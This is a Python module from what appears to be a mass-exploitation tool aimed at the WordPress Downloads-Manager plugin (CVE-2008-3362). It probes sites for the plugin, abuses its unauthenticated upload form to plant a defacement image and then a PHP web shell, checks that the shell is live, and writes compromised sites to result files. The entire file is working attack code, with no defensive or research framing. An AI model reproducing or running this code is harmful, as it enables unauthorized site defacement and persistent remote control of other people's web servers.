# coding=utf-8
import requests
import printModule

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Jce_Deface_image = 'files/pwn.gif'
pagelinesExploitShell = 'files/settings_auto.php'


def Exploit(site):
    try:
        Checkneko = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/img/unlock.gif',
                                 timeout=10, headers=Headers)
        if 'GIF89a' in str(Checkneko.content):
            PostDAta = {'dm_upload': ''}
            fileDeface = {'upfile': open(Jce_Deface_image, 'rb')}
            fileShell = {'upfile': open(pagelinesExploitShell, 'rb')}
            requests.post('http://' + site, data=PostDAta, files=fileDeface, timeout=10, headers=Headers)
            CheckIndex = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/upload/' +
                                      Jce_Deface_image.split('/')[1])
            if 'GIF89a' in str(CheckIndex.content):
                requests.post('http://' + site, data=PostDAta, files=fileShell, timeout=10, headers=Headers)
                requests.get('http://' + site + '/wp-content/plugins/downloads-manager/upload/' +
                             pagelinesExploitShell.split('/')[1], timeout=10, headers=Headers)
                CheckShell = requests.get('http://' + site + '/wp-content/neko.php',
                                          timeout=10, headers=Headers)
                if 'neko!!' in str(CheckShell.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                     pagelinesExploitShell.split('/')[1] + '\n')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/neko.htm' + '\n')
                    return printModule.returnYes(site, 'CVE-2008-3362', 'Downloads-Manager', 'Wordpress')
                else:
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                     Jce_Deface_image.split('/')[1] + '\n')
                    return printModule.returnYes(site, 'CVE-2008-3362', 'Downloads-Manager', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2008-3362', 'Downloads-Manager', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2008-3362', 'Downloads-Manager', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2008-3362', 'Downloads-Manager', 'Wordpress')
